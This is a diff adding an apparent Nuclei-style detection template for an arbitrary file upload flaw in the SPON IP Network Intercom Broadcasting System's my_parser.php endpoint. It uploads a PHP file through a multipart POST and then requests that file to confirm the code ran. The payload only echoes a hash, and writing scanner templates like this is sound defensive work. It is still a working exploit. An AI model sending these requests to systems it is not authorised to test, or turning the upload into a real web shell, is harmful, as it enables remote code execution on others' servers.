@@ -1,0 +1,48 @@
+id: poc-yaml-spon-my-parser-php-anyfile-upload
+info:
+  name: SPON IP Network Intercom Broadcasting System my_parser.php Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/upload/my_parser.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230"
+    body: |-
+      --0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230
+      Content-Disposition: form-data; name="upload"; filename="{{t1}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{t1}});?>
+      --0300a03a9419748c18d96a7e6e03d7be6f7f3f1ef6df950f196738fe8230--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/files/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
